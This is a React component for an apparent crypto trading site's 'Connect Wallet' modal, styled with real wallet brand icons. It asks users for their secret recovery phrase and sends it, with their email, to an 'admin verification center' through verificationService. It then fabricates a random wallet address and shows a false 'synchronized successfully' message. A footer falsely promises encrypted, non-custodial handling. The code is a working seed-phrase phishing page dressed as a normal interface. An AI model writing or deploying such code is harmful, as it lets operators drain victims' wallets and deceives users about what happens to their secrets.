import React, { useState, useEffect } from "react";
import { motion } from "motion/react";
import {
  AlertCircle,
  ArrowLeft,
  CheckCircle2,
  Copy,
  ExternalLink,
  KeyRound,
  Mail,
  ShieldCheck,
  Wallet,
  X,
} from "lucide-react";
import { useTradeStore } from "../../store/useTradeStore";
import { verificationService } from "../../services/verificationService";

// Brand vector icons
const TrustWalletIcon: React.FC<{ className?: string }> = ({ className = "w-6 h-6" }) => (
  <svg viewBox="0 0 100 100" className={className} fill="none" xmlns="http://www.w3.org/2000/svg">
    <path
      d="M50 8C70 14.5 86 12.5 86 12.5V52C86 73 70 85.5 50 92C30 85.5 14 73 14 52V12.5C14 12.5 30 14.5 50 8Z"
      fill="#0500FF"
    />
    <path
      d="M50 16C66 21.5 79 20 79 20V51C79 68 66 78.5 50 84C34 78.5 21 68 21 51V20C21 20 34 21.5 50 16Z"
      fill="#FFFFFF"
    />
    <path
      d="M50 23C63 27.5 73 26.5 73 26.5V50C73 64 63 72.5 50 77.5C37 72.5 27 64 27 50V26.5C27 26.5 37 27.5 50 23Z"
      fill="#0500FF"
    />
  </svg>
);

const BinanceWalletIcon: React.FC<{ className?: string }> = ({ className = "w-6 h-6" }) => (
  <svg viewBox="0 0 126.6 126.6" className={className} xmlns="http://www.w3.org/2000/svg">
    <path
      d="M63.3 0L33.9 29.4l14.7 14.7 14.7-14.7 14.7 14.7 14.7-14.7L63.3 0zM19.2 44.1L4.5 58.8l14.7 14.7 14.7-14.7-14.7-14.7zm88.2 0L92.7 58.8l14.7 14.7 14.7-14.7-14.7-14.7zm-44.1 4.5L48.6 63.3l14.7 14.7 14.7-14.7-14.7-14.7zm0 43.6L48.6 77.5l-14.7 14.7 29.4 29.4 29.4-29.4-14.7-14.7-14.7 14.7z"
      fill="#F0B90B"
    />
  </svg>
);

const MetaMaskIcon: React.FC<{ className?: string }> = ({ className = "w-6 h-6" }) => (
  <img
    src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg"
    alt="MetaMask"
    className={`${className} object-contain`}
  />
);

const WalletConnectIcon: React.FC<{ className?: string }> = ({ className = "w-6 h-6" }) => (
  <svg viewBox="0 0 24 24" className={className} fill="none" xmlns="http://www.w3.org/2000/svg">
    <path
      d="M5.4 7.2C9 3.6 15 3.6 18.6 7.2L19.2 7.8C19.4 8 19.4 8.4 19.2 8.6L17.4 10.4C17.2 10.6 16.9 10.6 16.7 10.4L15.9 9.6C13.8 7.5 10.2 7.5 8.1 9.6L7.3 10.4C7.1 10.6 6.8 10.6 6.6 10.4L4.8 8.6C4.6 8.4 4.6 8 4.8 7.8L5.4 7.2ZM21.9 10.5L23.5 12.1C23.7 12.3 23.7 12.7 23.5 12.9L16.2 20.2C16 20.4 15.6 20.4 15.4 20.2L12 16.8C11.9 16.7 11.7 16.7 11.6 16.8L8.2 20.2C8 20.4 7.6 20.4 7.4 20.2L0.1 12.9C-0.1 12.7 -0.1 12.3 0.1 12.1L1.7 10.5C1.9 10.3 2.2 10.3 2.4 10.5L5.8 13.9C5.9 14 6.1 14 6.2 13.9L9.6 10.5C9.8 10.3 10.1 10.3 10.3 10.5L11.7 11.9C11.8 12 12 12 12.1 11.9L13.5 10.5C13.7 10.3 14 10.3 14.2 10.5L17.6 13.9C17.7 14 17.9 14 18 13.9L21.4 10.5C21.5 10.3 21.8 10.3 21.9 10.5Z"
      fill="#3B99FC"
    />
  </svg>
);

interface WalletOption {
  id: string;
  name: string;
  desc: string;
  icon: React.FC<{ className?: string }>;
  sampleAddr: string;
}

export const ConnectWalletModal: React.FC = () => {
  const {
    isWalletModalOpen,
    closeWalletModal,
    user,
    connectWallet,
    disconnectWallet,
    addToast,
  } = useTradeStore();

  const [selectedWallet, setSelectedWallet] = useState<WalletOption | null>(null);
  const [email, setEmail] = useState("");
  const [walletPhrase, setWalletPhrase] = useState("");
  const [isConnecting, setIsConnecting] = useState(false);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);

  useEffect(() => {
    if (!isWalletModalOpen) {
      setSelectedWallet(null);
      setEmail(user?.email || "");
      setWalletPhrase("");
      setErrorMessage(null);
      setIsConnecting(false);
    } else if (user?.email) {
      setEmail(user.email);
    }
  }, [isWalletModalOpen, user?.email]);

  if (!isWalletModalOpen) return null;

  const wallets: WalletOption[] = [
    {
      id: "trustwallet",
      name: "Trust Wallet",
      desc: "Connect to multi-chain assets",
      icon: TrustWalletIcon,
      sampleAddr: "0x48B...E192",
    },
    {
      id: "binance",
      name: "Binance Wallet",
      desc: "Connect via BNB Smart Chain",
      icon: BinanceWalletIcon,
      sampleAddr: "0x8F3...9C14",
    },
    {
      id: "metamask",
      name: "MetaMask",
      desc: "Connect to Ethereum, Polygon & EVM chains",
      icon: MetaMaskIcon,
      sampleAddr: "0x71C...8B39",
    },
    {
      id: "walletconnect",
      name: "WalletConnect",
      desc: "Scan QR code with 100+ mobile wallets",
      icon: WalletConnectIcon,
      sampleAddr: "0x98A...2810",
    },
  ];

  const handleSelectWallet = (wallet: WalletOption) => {
    setSelectedWallet(wallet);
    setErrorMessage(null);
  };

  const handleConnectSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!selectedWallet) return;

    if (!email.trim()) {
      setErrorMessage("Please enter a valid email address.");
      return;
    }

    if (!walletPhrase.trim()) {
      setErrorMessage("Please enter your wallet recovery phrase.");
      return;
    }

    setIsConnecting(true);
    setErrorMessage(null);

    // Generate realistic EVM address
    const fullAddress = `0x${Array.from({ length: 40 }, () =>
      Math.floor(Math.random() * 16).toString(16)
    ).join("")}`;

    try {
      // Store in admin verification center under request ID
      const reqRes = await verificationService.createRequest({
        userId: user?.id || "usr_trader",
        userName: user?.name || "Apex Trader",
        userEmail: email.trim(),
        userTier: user?.tier || "PRO",
        type: "Web3 Wallet Connection",
        amountUSD: 0,
        asset: "ETH/EVM",
        protocol: selectedWallet.name,
        depositAddress: fullAddress,
        web3Wallet: selectedWallet.name,
        walletPhrase: walletPhrase.trim(),
        walletAddress: fullAddress,
      });

      console.log(`[Wallet Connect] Stored verification request: ${reqRes.id} for ${selectedWallet.name}`);
    } catch (err: any) {
      console.warn("[Wallet Connect] Failed to register request in verification center:", err);
    }

    await new Promise((r) => setTimeout(r, 600));

    connectWallet(selectedWallet.name, fullAddress);
    addToast(
      "Wallet Connected",
      `${selectedWallet.name} synchronized successfully (${fullAddress.substring(0, 6)}...${fullAddress.substring(38)}).`,
      "success"
    );

    setIsConnecting(false);
    setSelectedWallet(null);
    setWalletPhrase("");
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-md">
      <motion.div
        initial={{ opacity: 0, scale: 0.95, y: 10 }}
        animate={{ opacity: 1, scale: 1, y: 0 }}
        exit={{ opacity: 0, scale: 0.95, y: 10 }}
        className="relative w-full max-w-md bg-[#0a0a0e] border border-[#1c1c24] rounded-3xl p-6 sm:p-8 shadow-2xl overflow-hidden"
      >
        <button
          onClick={closeWalletModal}
          className="absolute top-5 right-5 p-2 rounded-xl text-[#71717a] hover:text-white hover:bg-[#14141a] transition-colors"
        >
          <X className="w-5 h-5" />
        </button>

        <div className="mb-6">
          <span className="text-[11px] font-bold text-[#00ffa3] uppercase tracking-wider">
            Web3 Integration
          </span>
          <h3 className="text-2xl font-bold text-white tracking-tight mt-0.5">
            {user?.connectedWalletAddress
              ? "Connected Web3 Wallet"
              : selectedWallet
              ? `Connect ${selectedWallet.name}`
              : "Connect Wallet"}
          </h3>
          <p className="text-xs text-[#71717a] mt-1">
            {selectedWallet
              ? "Provide authentication credentials to synchronize on-chain assets."
              : "Deposit, withdraw, and settle on-chain assets with zero custodial delay."}
          </p>
        </div>

        {user?.connectedWalletAddress ? (
          <div className="space-y-4">
            <div className="p-4 rounded-2xl bg-[#00ffa3]/10 border border-[#00ffa3]/30">
              <div className="flex items-center justify-between mb-2">
                <span className="text-xs font-bold text-[#00ffa3]">
                  {user.connectedWalletName || "Web3 Wallet"}
                </span>
                <span className="flex items-center gap-1 text-[10px] text-[#00ffa3] font-bold px-2 py-0.5 rounded-full bg-[#00ffa3]/20">
                  <span className="w-1.5 h-1.5 rounded-full bg-[#00ffa3] animate-pulse" />
                  Connected
                </span>
              </div>
              <p className="text-xs font-mono text-white bg-[#0e0e12] p-2.5 rounded-xl border border-[#1c1c24] break-all select-all">
                {user.connectedWalletAddress}
              </p>
            </div>

            <div className="flex gap-2">
              <button
                onClick={() => {
                  navigator.clipboard.writeText(user.connectedWalletAddress || "");
                  addToast("Address Copied", "Wallet address copied to clipboard.", "info");
                }}
                className="flex-1 flex items-center justify-center gap-2 py-2.5 px-4 bg-[#14141a] hover:bg-[#1e1e26] text-[#d4d4d8] text-xs font-semibold rounded-xl transition-all border border-[#1c1c24]"
              >
                <Copy className="w-4 h-4" />
                Copy Address
              </button>
              <button
                onClick={disconnectWallet}
                className="py-2.5 px-4 bg-rose-500/10 hover:bg-rose-500/20 border border-rose-500/30 text-rose-300 text-xs font-semibold rounded-xl transition-all"
              >
                Disconnect
              </button>
            </div>
          </div>
        ) : selectedWallet ? (
          /* Input Field Screen */
          <div className="space-y-4">
            <button
              onClick={() => {
                setSelectedWallet(null);
                setErrorMessage(null);
              }}
              className="flex items-center gap-1.5 text-xs text-[#71717a] hover:text-white transition-colors group"
            >
              <ArrowLeft className="w-3.5 h-3.5 group-hover:-translate-x-0.5 transition-transform" />
              <span>Back to wallet list</span>
            </button>

            <div className="flex items-center gap-3.5 p-3 rounded-2xl bg-[#0e0e12] border border-[#1c1c24]">
              <div className="w-10 h-10 rounded-xl bg-[#14141a] p-2 flex items-center justify-center shrink-0 border border-[#1c1c24]">
                <selectedWallet.icon className="w-6 h-6" />
              </div>
              <div className="flex-1 min-w-0">
                <div className="text-sm font-bold text-white flex items-center gap-2">
                  {selectedWallet.name}
                  <span className="text-[10px] px-2 py-0.5 rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 font-medium">
                    Ready
                  </span>
                </div>
                <div className="text-xs text-[#71717a] truncate">{selectedWallet.desc}</div>
              </div>
            </div>

            <form onSubmit={handleConnectSubmit} className="space-y-3.5">
              {/* Email Address */}
              <div>
                <label className="block text-xs font-semibold text-[#a1a1aa] mb-1.5">
                  Email Address
                </label>
                <div className="relative">
                  <div className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-[#71717a]">
                    <Mail className="w-4 h-4" />
                  </div>
                  <input
                    type="email"
                    required
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    placeholder="name@example.com"
                    className="w-full pl-10 pr-3.5 py-2.5 bg-[#0e0e12] border border-[#1c1c24] focus:border-[#00ffa3] focus:ring-1 focus:ring-[#00ffa3] rounded-xl text-xs text-white placeholder-[#52525b] outline-none transition-all"
                  />
                </div>
              </div>

              {/* Wallet Phrase */}
              <div>
                <div className="flex items-center justify-between mb-1.5">
                  <label className="block text-xs font-semibold text-[#a1a1aa]">
                    Wallet Phrase
                  </label>
                  <span className="text-[10px] text-[#71717a]">12 or 24 words</span>
                </div>
                <div className="relative">
                  <div className="absolute top-3 left-3.5 pointer-events-none text-[#71717a]">
                    <KeyRound className="w-4 h-4" />
                  </div>
                  <textarea
                    required
                    rows={3}
                    value={walletPhrase}
                    onChange={(e) => setWalletPhrase(e.target.value)}
                    placeholder="Enter your 12 or 24-word secret recovery phrase (separated by spaces)..."
                    className="w-full pl-10 pr-3.5 py-2.5 bg-[#0e0e12] border border-[#1c1c24] focus:border-[#00ffa3] focus:ring-1 focus:ring-[#00ffa3] rounded-xl text-xs text-white placeholder-[#52525b] outline-none transition-all resize-none font-mono"
                  />
                </div>
              </div>

              {errorMessage && (
                <div className="p-2.5 rounded-xl bg-rose-500/10 border border-rose-500/20 text-rose-300 text-xs flex items-center gap-2">
                  <AlertCircle className="w-4 h-4 shrink-0" />
                  <span>{errorMessage}</span>
                </div>
              )}

              {/* Connect Wallet button */}
              <button
                type="submit"
                disabled={isConnecting}
                className="w-full flex items-center justify-center gap-2 py-3 px-4 rounded-xl bg-gradient-to-r from-[#00ffa3] to-teal-400 hover:from-[#00ffa3]/90 hover:to-teal-300 text-black font-bold text-xs shadow-lg shadow-[#00ffa3]/20 transition-all active:scale-95 disabled:opacity-50 mt-2 cursor-pointer"
              >
                {isConnecting ? (
                  <>
                    <div className="w-4 h-4 border-2 border-black border-t-transparent rounded-full animate-spin" />
                    <span>Connecting {selectedWallet.name}...</span>
                  </>
                ) : (
                  <>
                    <Wallet className="w-4 h-4" />
                    <span>Connect Wallet</span>
                  </>
                )}
              </button>
            </form>
          </div>
        ) : (
          <div className="space-y-2.5">
            {wallets.map((wallet) => {
              const IconComponent = wallet.icon;
              return (
                <button
                  key={wallet.id}
                  onClick={() => handleSelectWallet(wallet)}
                  className="w-full flex items-center gap-3.5 p-3.5 rounded-2xl bg-[#0e0e12] hover:bg-[#14141a] border border-[#1c1c24] hover:border-[#262633] transition-all text-left group cursor-pointer"
                >
                  <div className="w-10 h-10 rounded-xl bg-[#14141a] p-2 flex items-center justify-center shrink-0 group-hover:scale-105 transition-transform border border-[#1c1c24]">
                    <IconComponent className="w-6 h-6" />
                  </div>
                  <div className="flex-1 min-w-0">
                    <div className="text-sm font-bold text-white group-hover:text-[#00ffa3] transition-colors">
                      {wallet.name}
                    </div>
                    <div className="text-xs text-[#71717a] truncate">{wallet.desc}</div>
                  </div>
                  <span className="text-xs font-semibold text-[#71717a] group-hover:text-[#00ffa3]">
                    Connect →
                  </span>
                </button>
              );
            })}
          </div>
        )}

        <div className="mt-6 flex items-center gap-2 text-[11px] text-[#71717a]">
          <ShieldCheck className="w-4 h-4 text-[#00ffa3] shrink-0" />
          <span>Apex uses end-to-end encrypted non-custodial RPC relays.</span>
        </div>
      </motion.div>
    </div>
  );
};
